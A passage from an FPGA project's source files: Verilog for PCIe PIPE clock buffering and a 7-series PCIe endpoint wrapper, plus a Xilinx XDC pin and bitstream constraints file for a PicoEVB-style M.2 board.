      BUFGCTRL pclk_i1
      (
        .CE0( 1'd1 ),         
        .CE1( 1'd1 ),        
        .I0( clk_125mhz ),   
        .I1( clk_250mhz ),   
        .IGNORE0( 1'd0 ),        
        .IGNORE1( 1'd0 ),        
        .S0( ~pclk_sel ),    
        .S1( pclk_sel ),    
        .O( pclk_1 )
      );
    
    end else begin : pclk_i1_bufg 
      
      // PCLK buffer
      BUFG pclk_i1(.I( clk_125mhz ), .O( clk_125mhz_buf ));
      
      assign pclk_1 = clk_125mhz_buf;
      
    end 
  endgenerate

  //
  // Select PCLK mux for slave or PCLK buffer
  //
  generate if (PCIE_CLK_SHARING_EN == "FALSE")
 
    begin : pclk_slave_disable
    
      // PCLK mux
      assign CLK_PCLK_SLAVE = 1'b0;
    
    end else if (PCIE_LINK_SPEED != 1) begin : pclk_slave_bufgctrl
    
      // PCLK mux
      BUFGCTRL pclk_slave
      (
        .CE0( 1'd1 ),         
        .CE1( 1'd1 ),        
        .I0( clk_125mhz ),   
        .I1( clk_250mhz ),   
        .IGNORE0( 1'd0 ),        
        .IGNORE1( 1'd0 ),        
        .S0( ~pclk_sel_slave ),    
        .S1( pclk_sel_slave ),    
        .O( CLK_PCLK_SLAVE )
      );
    
    end else begin : pclk_slave_bufg 
    
      // PCLK buffer
      BUFG pclk_slave(.I( clk_125mhz ), .O( CLK_PCLK_SLAVE ));
    
    end 
  endgenerate

  //
  // Generate RXOUTCLK buffer for debug
  //
  generate if ((PCIE_DEBUG_MODE == 1) || (PCIE_ASYNC_EN == "TRUE"))
        
    begin : rxoutclk_per_lane
    
      // generate per Lane
      for ( i = 0; i < PCIE_LANE; i = i + 1) 
    
        begin : rxoutclk_i
        
          // RXOUTCLK buffer
          BUFG rxoutclk_i(.I( CLK_RXOUTCLK_IN[i] ), .O( CLK_RXOUTCLK_OUT[i] ));
        
        end
      end         
    else
     
    begin : rxoutclk_i_disable
    
      // disable RXOUTCLK buffer for normal operation
      assign CLK_RXOUTCLK_OUT = { PCIE_LANE{1'd0} };
    
    end                   
  endgenerate 

  //
  // Generate DCLK buffer
  //
  generate if (PCIE_LINK_SPEED != 1)

    begin : dclk_i_bufg
    
      // DCLK buffer
      BUFG dclk_i(.I( clk_125mhz ), .O( CLK_DCLK ));
      
    end else begin : dclk_i
    
      // always 125 MHz in Gen1
      assign CLK_DCLK = clk_125mhz_buf; 
      
    end
  endgenerate

  //
  // Generate USERCLK1 buffer
  //
  generate if (PCIE_GEN1_MODE == 1'b1 && PCIE_USERCLK1_FREQ == 3)
       
    begin : userclk1_i1_no_bufg
    
      // USERCLK1 same as PCLK
      assign userclk1_1 = pclk_1;
      
    end else begin : userclk1_i1
    
      // USERCLK1 buffer
      BUFG usrclk1_i1(.I( userclk1 ), .O( userclk1_1 ));
 
    end 
  endgenerate 

  //
  // Generate USERCLK2 buffer
  //
  generate if (PCIE_GEN1_MODE == 1'b1 && PCIE_USERCLK2_FREQ == 3 )  

    begin : userclk2_i1_no_bufg0
    
      // USERCLK2 same as PCLK
      assign userclk2_1 = pclk_1;
      
    end else if (PCIE_USERCLK2_FREQ == PCIE_USERCLK1_FREQ ) begin : userclk2_i1_no_bufg1
    
      // USERCLK2 same as USERCLK1
      assign userclk2_1 = userclk1_1;
      
    end else begin : userclk2_i1
    
      // USERCLK2 buffer
      BUFG usrclk2_i1(.I( userclk2 ), .O( userclk2_1 ));
      
    end
  endgenerate 

  //
  // Generate OOBCLK buffer
  //
  generate if (PCIE_OOBCLK_MODE == 2) 

    begin : oobclk_i1
    
      // OOBCLK buffer
      BUFG oobclk_i1(.I( oobclk ), .O( CLK_OOBCLK ));
      
    end else begin : oobclk_i1_disable
    
      // disable OOBCLK buffer
      assign CLK_OOBCLK = pclk;
      
    end  
  endgenerate 

  //
  // Disabled second stage buffers
  //
  assign pclk = pclk_1;
  assign CLK_RXUSRCLK = pclk_1;
  assign CLK_USERCLK1 = userclk1_1;
  assign CLK_USERCLK2 = userclk2_1;
 
  //
  // Select PCLK
  //
  always @ (posedge pclk) begin

    if (!CLK_RST_N)
    
      pclk_sel <= 1'd0;
        
    else  begin
           
      if (&pclk_sel_reg2)

        // select 250 MHz      
        pclk_sel <= 1'd1;
                 
      else if (&(~pclk_sel_reg2))
         
        // select 125 MHz
        pclk_sel <= 1'd0;  

      else
             
        // hold PCLK 
        pclk_sel <= pclk_sel;
        
    end
  end        

  always @ (posedge pclk) begin

    if (!CLK_RST_N)
    
      pclk_sel_slave <= 1'd0;
        
    else begin     
        
      if (&pclk_sel_slave_reg2)
        
        // select 250 MHz            
        pclk_sel_slave <= 1'd1;
                      
      else if (&(~pclk_sel_slave_reg2))
        
        // select 125 MHz
        pclk_sel_slave <= 1'd0;  
        
      else
        
        // hold PCLK
        pclk_sel_slave <= pclk_sel_slave;
            
    end
  end     

  //
  // PIPE clock output
  //
  assign CLK_PCLK = pclk;
  assign CLK_MMCM_LOCK = mmcm_lock;

endmodule

```

`hdl/pcie_7x_0_support.v`:

```v
//
// PCI Express endpoint shared logic wrapper
//

`timescale 1ns / 1ps

module pcie_7x_0_support # 
(
  parameter LINK_CAP_MAX_LINK_WIDTH = 8,    // PCIe Lane Width
  parameter CLK_SHARING_EN = "FALSE",       // Enable Clock Sharing
  parameter C_DATA_WIDTH = 256,             // AXI interface data width
  parameter KEEP_WIDTH = C_DATA_WIDTH / 8,  // TSTRB width
  parameter PCIE_REFCLK_FREQ = 0,           // PCIe reference clock frequency
  parameter PCIE_USERCLK1_FREQ = 2,         // PCIe user clock 1 frequency
  parameter PCIE_USERCLK2_FREQ = 2,         // PCIe user clock 2 frequency
  parameter PCIE_GT_DEVICE = "GTX",         // PCIe GT device
  parameter PCIE_USE_MODE = "2.1"           // PCIe use mode
)(
  //
  // PCI Express interface
  //
  output [(LINK_CAP_MAX_LINK_WIDTH - 1) : 0] pci_exp_txn,
  output [(LINK_CAP_MAX_LINK_WIDTH - 1) : 0] pci_exp_txp,
  input [(LINK_CAP_MAX_LINK_WIDTH - 1) : 0] pci_exp_rxn,
  input [(LINK_CAP_MAX_LINK_WIDTH - 1) : 0] pci_exp_rxp,

  //
  // Clocking sharing interface
  //
  output pipe_pclk_out_slave,
  output pipe_rxusrclk_out,
  output [(LINK_CAP_MAX_LINK_WIDTH - 1) : 0] pipe_rxoutclk_out,
  output pipe_dclk_out,
  output pipe_userclk1_out,
  output pipe_userclk2_out,
  output pipe_oobclk_out,
  output pipe_mmcm_lock_out,
  input [(LINK_CAP_MAX_LINK_WIDTH - 1) : 0] pipe_pclk_sel_slave,
  input pipe_mmcm_rst_n,

  //
  // AXI common
  //
  output user_clk_out,
  output user_reset_out,
  output user_lnk_up,
  output user_app_rdy,
  input tx_cfg_gnt,
  input rx_np_ok,
  input rx_np_req,
  input cfg_turnoff_ok,
  input cfg_trn_pending,
  input cfg_pm_halt_aspm_l0s,
  input cfg_pm_halt_aspm_l1,
  input cfg_pm_force_state_en,
  input [1:0] cfg_pm_force_state,
  input [63:0] cfg_dsn,
  input cfg_pm_send_pme_to,
  input [7:0] cfg_ds_bus_number,
  input [4:0] cfg_ds_device_number,
  input [2:0] cfg_ds_function_number,
  input cfg_pm_wake,
  
  //
  // AXI tx
  //
  input [C_DATA_WIDTH - 1 : 0] s_axis_tx_tdata,
  input s_axis_tx_tvalid,
  output s_axis_tx_tready,
  input [KEEP_WIDTH - 1 : 0] s_axis_tx_tkeep,
  input s_axis_tx_tlast,
  input [3:0] s_axis_tx_tuser,

  //
  // AXI RX
  //
  output [C_DATA_WIDTH - 1 : 0] m_axis_rx_tdata,
  output m_axis_rx_tvalid,
  input m_axis_rx_tready,
  output [KEEP_WIDTH - 1 : 0] m_axis_rx_tkeep,
  output m_axis_rx_tlast,
  output [21:0] m_axis_rx_tuser,

  //
  // Flow control
  //
  output [11:0] fc_cpld,
  output [7:0] fc_cplh,
  output [11:0] fc_npd,
  output [7:0] fc_nph,
  output [11:0] fc_pd,
  output [7:0] fc_ph,
  input [2:0] fc_sel,

  //
  // Configuration interface
  //
  output tx_err_drop,
  output tx_cfg_req,
  output [5:0] tx_buf_av,
  output [15:0] cfg_status,
  output [15:0] cfg_command,
  output [15:0] cfg_dstatus,
  output [15:0] cfg_dcommand,
  output [15:0] cfg_lstatus,
  output [15:0] cfg_lcommand,
  output [15:0] cfg_dcommand2,
  output [2:0] cfg_pcie_link_state,
  output cfg_to_turnoff,
  output [7:0] cfg_bus_number,
  output [4:0] cfg_device_number,
  output [2:0] cfg_function_number,
  output cfg_pmcsr_pme_en,
  output [1:0] cfg_pmcsr_powerstate,
  output cfg_pmcsr_pme_status,
  output cfg_received_func_lvl_rst,

  //
  // RP only
  //
  output cfg_bridge_serr_en,
  output cfg_slot_control_electromech_il_ctl_pulse,
  output cfg_root_control_syserr_corr_err_en,
  output cfg_root_control_syserr_non_fatal_err_en,
  output cfg_root_control_syserr_fatal_err_en,
  output cfg_root_control_pme_int_en,
  output cfg_aer_rooterr_corr_err_reporting_en,
  output cfg_aer_rooterr_non_fatal_err_reporting_en,
  output cfg_aer_rooterr_fatal_err_reporting_en,
  output cfg_aer_rooterr_corr_err_received,
  output cfg_aer_rooterr_non_fatal_err_received,
  output cfg_aer_rooterr_fatal_err_received,
  
  //
  // VC interface
  //
  output [6:0] cfg_vc_tcvc_map,

  //
  // Management interface
  //
  output [31:0] cfg_mgmt_do,
  output cfg_mgmt_rd_wr_done,
  input [31:0] cfg_mgmt_di,
  input [3:0] cfg_mgmt_byte_en,
  input [9:0] cfg_mgmt_dwaddr,
  input cfg_mgmt_wr_en,
  input cfg_mgmt_rd_en,
  input cfg_mgmt_wr_readonly,
  input cfg_mgmt_wr_rw1c_as_rw,

  //
  // Error reporting interface
  //
  input cfg_err_ecrc,
  input cfg_err_ur,
  input cfg_err_cpl_timeout,
  input cfg_err_cpl_unexpect,
  input cfg_err_cpl_abort,
  input cfg_err_posted,
  input cfg_err_cor,
  input cfg_err_atomic_egress_blocked,
  input cfg_err_internal_cor,
  input cfg_err_malformed,
  input cfg_err_mc_blocked,
  input cfg_err_poisoned,
  input cfg_err_norecovery,
  input [47:0] cfg_err_tlp_cpl_header,
  output cfg_err_cpl_rdy,
  input cfg_err_locked,
  input cfg_err_acs,
  input cfg_err_internal_uncor,
  
  //
  // AER interface
  //
  input [127:0] cfg_err_aer_headerlog,
  input [4:0] cfg_aer_interrupt_msgnum,
  output cfg_err_aer_headerlog_set,
  output cfg_aer_ecrc_check_en,
  output cfg_aer_ecrc_gen_en,
  output cfg_msg_received,
  output [15:0] cfg_msg_data,
  output cfg_msg_received_pm_as_nak,
  output cfg_msg_received_setslotpowerlimit,
  output cfg_msg_received_err_cor,
  output cfg_msg_received_err_non_fatal,
  output cfg_msg_received_err_fatal,
  output cfg_msg_received_pm_pme,
  output cfg_msg_received_pme_to_ack,
  output cfg_msg_received_assert_int_a,
  output cfg_msg_received_assert_int_b,
  output cfg_msg_received_assert_int_c,
  output cfg_msg_received_assert_int_d,
  output cfg_msg_received_deassert_int_a,
  output cfg_msg_received_deassert_int_b,
  output cfg_msg_received_deassert_int_c,
  output cfg_msg_received_deassert_int_d,

  //
  // Interrupt interface signals
  //
  input cfg_interrupt,
  output cfg_interrupt_rdy,
  input cfg_interrupt_assert,
  input [7:0] cfg_interrupt_di,
  output [7:0] cfg_interrupt_do,
  output [2:0] cfg_interrupt_mmenable,
  output cfg_interrupt_msienable,
  output cfg_interrupt_msixenable,
  output cfg_interrupt_msixfm,
  input cfg_interrupt_stat,
  input [4:0] cfg_pciecap_interrupt_msgnum,

  //
  // Physical layer control and status interface
  //  
  input [1:0] pl_directed_link_change,
  input [1:0] pl_directed_link_width,
  input pl_directed_link_speed,
  input pl_directed_link_auton,
  input pl_upstream_prefer_deemph, 
  output pl_sel_lnk_rate,
  output [1:0] pl_sel_lnk_width,
  output [5:0] pl_ltssm_state,
  output [1:0] pl_lane_reversal_mode,
  output pl_phy_lnk_up,
  output [2:0] pl_tx_pm_state,
  output [1:0] pl_rx_pm_state,
  output pl_link_upcfg_cap,
  output pl_link_gen2_cap,
  output pl_link_partner_gen2_supported,
  output [2:0] pl_initial_link_width,
  output pl_directed_change_done,
  output pl_received_hot_rst,
  input pl_transmit_hot_rst,
  input pl_downstream_deemph_source,

  //
  // PCI Express DRP interface
  //
  input pcie_drp_clk,
  input pcie_drp_en,
  input pcie_drp_we,
  input [8:0] pcie_drp_addr,
  input [15:0] pcie_drp_di,
  output pcie_drp_rdy,
  output [15:0] pcie_drp_do,

  //
  // System interface
  //
  input sys_clk,
  input sys_rst_n
);
  //
  // Wires used for external clocking connectivity
  //
  wire pipe_pclk_out;
  wire pipe_txoutclk_in;
  wire [(LINK_CAP_MAX_LINK_WIDTH - 1) : 0] pipe_rxoutclk_in;
  wire [(LINK_CAP_MAX_LINK_WIDTH - 1) : 0] pipe_pclk_sel_in;
  wire pipe_gen3_in;

  //
  // Wires used for external GT COMMON connectivity
  //
  wire [11:0] qpll_drp_crscode;
  wire [17:0] qpll_drp_fsm;
  wire [1:0] qpll_drp_done;
  wire [1:0] qpll_drp_reset;
  wire qpll_qplld;
  wire [1:0] qpll_qpllreset;
  wire qpll_drp_clk;
  wire qpll_drp_rst_n;
  wire qpll_drp_ovrd;
  wire qpll_drp_gen3;
  wire qpll_drp_start;

  //
  // PIPE clock shared mode
  //
  pcie_7x_0_pipe_clock #
  (
    .PCIE_ASYNC_EN( "FALSE" ),                  // PCIe async enable
    .PCIE_TXBUF_EN( "FALSE" ),                  // PCIe TX buffer enable for Gen1/Gen2 only
    .PCIE_LANE( LINK_CAP_MAX_LINK_WIDTH ),      // PCIe number of lanes    
    .PCIE_LINK_SPEED( 2 ),                      // PCIe version
    .PCIE_REFCLK_FREQ( PCIE_REFCLK_FREQ ),      // PCIe reference clock frequency
    .PCIE_USERCLK1_FREQ( PCIE_USERCLK1_FREQ ),  // PCIe user clock 1 frequency
    .PCIE_USERCLK2_FREQ( PCIE_USERCLK2_FREQ ),  // PCIe user clock 2 frequency
    .PCIE_DEBUG_MODE( 0 )
  )
  pipe_clock_i
  (
    // Input
    .CLK_CLK( sys_clk ),
    .CLK_TXOUTCLK( pipe_txoutclk_in ),
    .CLK_RXOUTCLK_IN( pipe_rxoutclk_in ),
    .CLK_RST_N( pipe_mmcm_rst_n ),             
    .CLK_PCLK_SEL( pipe_pclk_sel_in ),
    .CLK_PCLK_SEL_SLAVE( pipe_pclk_sel_slave),
    .CLK_GEN3( pipe_gen3_in ),

    // Output
    .CLK_PCLK( pipe_pclk_out ),
    .CLK_PCLK_SLAVE( pipe_pclk_out_slave ),
    .CLK_RXUSRCLK( pipe_rxusrclk_out ),
    .CLK_RXOUTCLK_OUT( pipe_rxoutclk_out ),
    .CLK_DCLK( pipe_dclk_out ),
    .CLK_OOBCLK( pipe_oobclk_out ),
    .CLK_USERCLK1( pipe_userclk1_out ),
    .CLK_USERCLK2( pipe_userclk2_out ),
    .CLK_MMCM_LOCK( pipe_mmcm_lock_out )
  );

  //
  // GT common internal mode
  //
  wire [1:0] qpll_qplllock;
  wire [1:0] qpll_qplloutclk;
  wire [1:0] qpll_qplloutrefclk;
            
  assign qpll_drp_done = 2'd0;
  assign qpll_drp_reset = 2'd0;
  assign qpll_drp_crscode = 12'd0;
  assign qpll_drp_fsm =  18'd0;
  assign qpll_qplloutclk = 2'd0;
  assign qpll_qplloutrefclk = 2'd0;
  assign qpll_qplllock = 2'd0;

  //
  // PCI Express integrated endpoint block
  //
  pcie_7x_0 pcie_7x_0_i
  (
    .pci_exp_txn( pci_exp_txn ),
    .pci_exp_txp( pci_exp_txp ),
    .pci_exp_rxn( pci_exp_rxn ),
    .pci_exp_rxp( pci_exp_rxp ),
    .pipe_pclk_in( pipe_pclk_out ),
    .pipe_rxusrclk_in( pipe_rxusrclk_out ),
    .pipe_rxoutclk_in( pipe_rxoutclk_out ),
    .pipe_mmcm_rst_n( pipe_mmcm_rst_n ),
    .pipe_dclk_in( pipe_dclk_out ),
    .pipe_userclk1_in( pipe_userclk1_out ),
    .pipe_userclk2_in( pipe_userclk2_out ),
    .pipe_oobclk_in( pipe_oobclk_out ),
    .pipe_mmcm_lock_in( pipe_mmcm_lock_out ),
    .pipe_txoutclk_out( pipe_txoutclk_in ),
    .pipe_rxoutclk_out( pipe_rxoutclk_in ),
    .pipe_pclk_sel_out( pipe_pclk_sel_in ),
    .pipe_gen3_out( pipe_gen3_in ),
    .user_clk_out( user_clk_out ),
    .user_reset_out( user_reset_out ),
    .user_lnk_up( user_lnk_up ),
    .user_app_rdy( user_app_rdy ),
    .s_axis_tx_tdata( s_axis_tx_tdata ),
    .s_axis_tx_tvalid( s_axis_tx_tvalid ),
    .s_axis_tx_tready( s_axis_tx_tready ),
    .s_axis_tx_tkeep( s_axis_tx_tkeep ),
    .s_axis_tx_tlast( s_axis_tx_tlast ),
    .s_axis_tx_tuser( s_axis_tx_tuser ),
    .m_axis_rx_tdata( m_axis_rx_tdata ),
    .m_axis_rx_tvalid( m_axis_rx_tvalid ),
    .m_axis_rx_tready( m_axis_rx_tready ),
    .m_axis_rx_tkeep( m_axis_rx_tkeep ),
    .m_axis_rx_tlast( m_axis_rx_tlast ),
    .m_axis_rx_tuser( m_axis_rx_tuser ),
    .tx_cfg_gnt( tx_cfg_gnt ),
    .rx_np_ok( rx_np_ok ),
    .rx_np_req( rx_np_req ),
    .cfg_trn_pending( cfg_trn_pending ),
    .cfg_pm_halt_aspm_l0s( cfg_pm_halt_aspm_l0s ),
    .cfg_pm_halt_aspm_l1( cfg_pm_halt_aspm_l1 ),
    .cfg_pm_force_state_en( cfg_pm_force_state_en ),
    .cfg_pm_force_state( cfg_pm_force_state ),
    .cfg_dsn( cfg_dsn ),
    .cfg_turnoff_ok( cfg_turnoff_ok ),
    .cfg_pm_wake( cfg_pm_wake ),
    .cfg_pm_send_pme_to( cfg_pm_send_pme_to ),
    .cfg_ds_bus_number( cfg_ds_bus_number ),
    .cfg_ds_device_number( cfg_ds_device_number ),
    .cfg_ds_function_number( cfg_ds_function_number ),
    .fc_cpld( fc_cpld ),
    .fc_cplh( fc_cplh ),
    .fc_npd( fc_npd ),
    .fc_nph( fc_nph ),
    .fc_pd( fc_pd ),
    .fc_ph( fc_ph ),
    .fc_sel( fc_sel ),
    .cfg_mgmt_do( cfg_mgmt_do ),
    .cfg_mgmt_rd_wr_done( cfg_mgmt_rd_wr_done ),
    .cfg_mgmt_di( cfg_mgmt_di ),
    .cfg_mgmt_byte_en( cfg_mgmt_byte_en ),
    .cfg_mgmt_dwaddr( cfg_mgmt_dwaddr ),
    .cfg_mgmt_wr_en( cfg_mgmt_wr_en ),
    .cfg_mgmt_rd_en( cfg_mgmt_rd_en ),
    .cfg_mgmt_wr_readonly( cfg_mgmt_wr_readonly ),
    .cfg_mgmt_wr_rw1c_as_rw( cfg_mgmt_wr_rw1c_as_rw ),
    .tx_buf_av( tx_buf_av ),
    .tx_err_drop( tx_err_drop ),
    .tx_cfg_req( tx_cfg_req ),
    .cfg_status( cfg_status ),
    .cfg_command( cfg_command ),
    .cfg_dstatus( cfg_dstatus ),
    .cfg_dcommand( cfg_dcommand ),
    .cfg_lstatus( cfg_lstatus ),
    .cfg_lcommand( cfg_lcommand ),
    .cfg_dcommand2( cfg_dcommand2 ),
    .cfg_pcie_link_state( cfg_pcie_link_state ),
    .cfg_pmcsr_pme_en( cfg_pmcsr_pme_en ),
    .cfg_pmcsr_powerstate( cfg_pmcsr_powerstate ),
    .cfg_pmcsr_pme_status( cfg_pmcsr_pme_status ),
    .cfg_vc_tcvc_map( cfg_vc_tcvc_map ),
    .cfg_to_turnoff( cfg_to_turnoff ),
    .cfg_bus_number( cfg_bus_number ),
    .cfg_device_number( cfg_device_number ),
    .cfg_function_number( cfg_function_number ),
    .cfg_bridge_serr_en( cfg_bridge_serr_en ),
    .cfg_slot_control_electromech_il_ctl_pulse( cfg_slot_control_electromech_il_ctl_pulse ),
    .cfg_root_control_syserr_corr_err_en( cfg_root_control_syserr_corr_err_en ),
    .cfg_root_control_syserr_non_fatal_err_en( cfg_root_control_syserr_non_fatal_err_en ),
    .cfg_root_control_syserr_fatal_err_en( cfg_root_control_syserr_fatal_err_en ),
    .cfg_root_control_pme_int_en( cfg_root_control_pme_int_en ),
    .cfg_aer_rooterr_corr_err_reporting_en( cfg_aer_rooterr_corr_err_reporting_en ),
    .cfg_aer_rooterr_non_fatal_err_reporting_en( cfg_aer_rooterr_non_fatal_err_reporting_en ),
    .cfg_aer_rooterr_fatal_err_reporting_en( cfg_aer_rooterr_fatal_err_reporting_en ),
    .cfg_aer_rooterr_corr_err_received( cfg_aer_rooterr_corr_err_received ),
    .cfg_aer_rooterr_non_fatal_err_received( cfg_aer_rooterr_non_fatal_err_received ),
    .cfg_aer_rooterr_fatal_err_received( cfg_aer_rooterr_fatal_err_received ),
    .cfg_received_func_lvl_rst( cfg_received_func_lvl_rst ),
    .cfg_err_ecrc( cfg_err_ecrc ),
    .cfg_err_ur( cfg_err_ur ),
    .cfg_err_cpl_timeout( cfg_err_cpl_timeout ),
    .cfg_err_cpl_unexpect( cfg_err_cpl_unexpect ),
    .cfg_err_cpl_abort( cfg_err_cpl_abort ),
    .cfg_err_posted( cfg_err_posted ),
    .cfg_err_cor( cfg_err_cor ),
    .cfg_err_atomic_egress_blocked( cfg_err_atomic_egress_blocked ),
    .cfg_err_internal_cor( cfg_err_internal_cor ),
    .cfg_err_malformed( cfg_err_malformed ),
    .cfg_err_mc_blocked( cfg_err_mc_blocked ),
    .cfg_err_poisoned( cfg_err_poisoned ),
    .cfg_err_norecovery( cfg_err_norecovery ),
    .cfg_err_tlp_cpl_header( cfg_err_tlp_cpl_header ),
    .cfg_err_cpl_rdy( cfg_err_cpl_rdy ),
    .cfg_err_locked( cfg_err_locked ),
    .cfg_err_acs( cfg_err_acs ),
    .cfg_err_internal_uncor( cfg_err_internal_uncor ),
    .cfg_aer_ecrc_check_en( cfg_aer_ecrc_check_en ),
    .cfg_aer_ecrc_gen_en( cfg_aer_ecrc_gen_en ),
    .cfg_err_aer_headerlog( cfg_err_aer_headerlog ),
    .cfg_err_aer_headerlog_set( cfg_err_aer_headerlog_set ),
    .cfg_aer_interrupt_msgnum( cfg_aer_interrupt_msgnum ),
    .cfg_interrupt( cfg_interrupt ),
    .cfg_interrupt_rdy( cfg_interrupt_rdy ),
    .cfg_interrupt_assert( cfg_interrupt_assert ),
    .cfg_interrupt_di( cfg_interrupt_di ),
    .cfg_interrupt_do( cfg_interrupt_do ),
    .cfg_interrupt_mmenable( cfg_interrupt_mmenable ),
    .cfg_interrupt_msienable( cfg_interrupt_msienable ),
    .cfg_interrupt_msixenable( cfg_interrupt_msixenable ),
    .cfg_interrupt_msixfm( cfg_interrupt_msixfm ),
    .cfg_interrupt_stat( cfg_interrupt_stat ),
    .cfg_pciecap_interrupt_msgnum( cfg_pciecap_interrupt_msgnum ),
    .cfg_msg_received( cfg_msg_received ),
    .cfg_msg_data( cfg_msg_data ),
    .cfg_msg_received_pm_as_nak( cfg_msg_received_pm_as_nak ),
    .cfg_msg_received_setslotpowerlimit( cfg_msg_received_setslotpowerlimit ),
    .cfg_msg_received_err_cor( cfg_msg_received_err_cor ),
    .cfg_msg_received_err_non_fatal( cfg_msg_received_err_non_fatal ),
    .cfg_msg_received_err_fatal( cfg_msg_received_err_fatal ),
    .cfg_msg_received_pm_pme( cfg_msg_received_pm_pme ),
    .cfg_msg_received_pme_to_ack( cfg_msg_received_pme_to_ack ),
    .cfg_msg_received_assert_int_a( cfg_msg_received_assert_int_a ),
    .cfg_msg_received_assert_int_b( cfg_msg_received_assert_int_b ),
    .cfg_msg_received_assert_int_c( cfg_msg_received_assert_int_c ),
    .cfg_msg_received_assert_int_d( cfg_msg_received_assert_int_d ),
    .cfg_msg_received_deassert_int_a( cfg_msg_received_deassert_int_a ),
    .cfg_msg_received_deassert_int_b( cfg_msg_received_deassert_int_b ),
    .cfg_msg_received_deassert_int_c( cfg_msg_received_deassert_int_c ),
    .cfg_msg_received_deassert_int_d( cfg_msg_received_deassert_int_d ),
    .pl_directed_link_change( pl_directed_link_change ),
    .pl_directed_link_width( pl_directed_link_width ),
    .pl_directed_link_speed( pl_directed_link_speed ),
    .pl_directed_link_auton( pl_directed_link_auton ),
    .pl_upstream_prefer_deemph( pl_upstream_prefer_deemph ),
    .pl_sel_lnk_rate( pl_sel_lnk_rate ),
    .pl_sel_lnk_width( pl_sel_lnk_width ),
    .pl_ltssm_state( pl_ltssm_state ),
    .pl_lane_reversal_mode( pl_lane_reversal_mode ),
    .pl_phy_lnk_up( pl_phy_lnk_up ),
    .pl_tx_pm_state( pl_tx_pm_state ),
    .pl_rx_pm_state( pl_rx_pm_state ),
    .pl_link_upcfg_cap( pl_link_upcfg_cap ),
    .pl_link_gen2_cap( pl_link_gen2_cap ),
    .pl_link_partner_gen2_supported( pl_link_partner_gen2_supported ),
    .pl_initial_link_width( pl_initial_link_width ),
    .pl_directed_change_done( pl_directed_change_done ),
    .pl_received_hot_rst( pl_received_hot_rst ),
    .pl_transmit_hot_rst( pl_transmit_hot_rst ),
    .pl_downstream_deemph_source( pl_downstream_deemph_source ),
    .pcie_drp_clk( pcie_drp_clk ),
    .pcie_drp_en( pcie_drp_en ),
    .pcie_drp_we( pcie_drp_we ),
    .pcie_drp_addr( pcie_drp_addr ),
    .pcie_drp_di( pcie_drp_di ),
    .pcie_drp_rdy( pcie_drp_rdy ),
    .pcie_drp_do( pcie_drp_do ),
    .sys_clk( sys_clk ),
    .sys_rst_n( sys_rst_n )
  );

endmodule

```

`hdl/pico_evb.xdc`:

```xdc
###############################################################################
# Pinout and Related I/O Constraints
###############################################################################

# SYS reset (input) signal. The sys_reset_n signal is generated
# by the PCI Express interface (PERST#).
set_property PACKAGE_PIN A10 [get_ports sys_rst_n]
set_property IOSTANDARD LVCMOS33 [get_ports sys_rst_n]
set_property PULLDOWN true [get_ports sys_rst_n]

# SYS clock 100 MHz (input) signal. The sys_clk_p and sys_clk_n
# signals are the PCI Express reference clock. 
set_property PACKAGE_PIN B6 [get_ports sys_clk_p]

# PCIe x1 link
set_property PACKAGE_PIN G4 [get_ports pcie_rxp]
set_property PACKAGE_PIN G3 [get_ports pcie_rxn]
set_property PACKAGE_PIN B2 [get_ports pcie_txp]
set_property PACKAGE_PIN B1 [get_ports pcie_txn]

###############################################################################
# Timing Constraints
###############################################################################

create_clock -period 10.000 -name sys_clk [get_ports sys_clk_p]

###############################################################################
# Physical Constraints
###############################################################################

# Input reset is resynchronized within FPGA design as necessary
set_false_path -from [get_ports sys_rst_n]

###############################################################################
# SPI
###############################################################################

set_property PACKAGE_PIN K16 [get_ports {spi_io0_io}]
set_property PACKAGE_PIN L17 [get_ports {spi_io1_io}]
set_property PACKAGE_PIN J15 [get_ports {spi_io2_io}]
set_property PACKAGE_PIN J16 [get_ports {spi_io3_io}]
set_property PACKAGE_PIN L15 [get_ports {spi_ss_io}]
set_property IOSTANDARD LVCMOS33 [get_ports {spi_io0_io}]
set_property IOSTANDARD LVCMOS33 [get_ports {spi_io1_io}]
set_property IOSTANDARD LVCMOS33 [get_ports {spi_io2_io}]
set_property IOSTANDARD LVCMOS33 [get_ports {spi_io3_io}]
set_property IOSTANDARD LVCMOS33 [get_ports {spi_ss_io}]

###############################################################################
# NanoEVB, PicoEVB common I/O
###############################################################################

set_property PACKAGE_PIN V14 [get_ports {user_led[2]}]
set_property PACKAGE_PIN V13 [get_ports {user_led[1]}]
set_property PACKAGE_PIN V12 [get_ports {user_led[0]}]
set_property IOSTANDARD LVCMOS33 [get_ports {user_led[2]}]
set_property IOSTANDARD LVCMOS33 [get_ports {user_led[1]}]
set_property IOSTANDARD LVCMOS33 [get_ports {user_led[0]}]
set_property PULLUP true [get_ports {user_led[2]}]
set_property PULLUP true [get_ports {user_led[1]}]
set_property PULLUP true [get_ports {user_led[0]}]
set_property DRIVE 8 [get_ports {user_led[2]}]
set_property DRIVE 8 [get_ports {user_led[1]}]
set_property DRIVE 8 [get_ports {user_led[0]}]

# clkreq_l is active low clock request for M.2 card to
# request PCI Express reference clock
set_property PACKAGE_PIN A9 [get_ports {clkreq_l}]
set_property IOSTANDARD LVCMOS33 [get_ports {clkreq_l}]
set_property PULLDOWN true [get_ports {clkreq_l}]

# Auxillary I/O Connector
set_property PACKAGE_PIN A14 [get_ports {uart_rxd}]
set_property PACKAGE_PIN A13 [get_ports {uart_txd}]
set_property IOSTANDARD LVCMOS33 [get_ports {uart_rxd}]
set_property IOSTANDARD LVCMOS33 [get_ports {uart_txd}]
set_property PACKAGE_PIN B12 [get_ports {user_io[0]}]
set_property PACKAGE_PIN A12 [get_ports {user_io[1]}]
set_property IOSTANDARD LVCMOS33 [get_ports {user_io[0]}]
set_property IOSTANDARD LVCMOS33 [get_ports {user_io[1]}]
set_property PULLDOWN true [get_ports {user_io[0]}]
set_property PULLDOWN true [get_ports {user_io[1]}]

###############################################################################
# Additional design / project settings
###############################################################################

# Power down on overtemp
set_property BITSTREAM.CONFIG.OVERTEMPPOWERDOWN ENABLE [current_design]

# High-speed configuration so FPGA is up in time to negotiate with PCIe root complex
set_property BITSTREAM.CONFIG.CONFIGRATE 66 [current_design]
set_property BITSTREAM.CONFIG.SPI_BUSWIDTH 4 [current_design]
set_property CONFIG_MODE SPIx4 [current_design]
set_property BITSTREAM.CONFIG.SPI_FALL_EDGE YES [current_design]
set_property BITSTREAM.GENERAL.COMPRESS TRUE [current_design]

set_property CONFIG_VOLTAGE 3.3 [current_design]
set_property CFGBVS VCCO [current_design]

```

`ip/axis_data_fifo_0.xci`:

```xci
<?xml version="1.0" encoding="UTF-8"?>
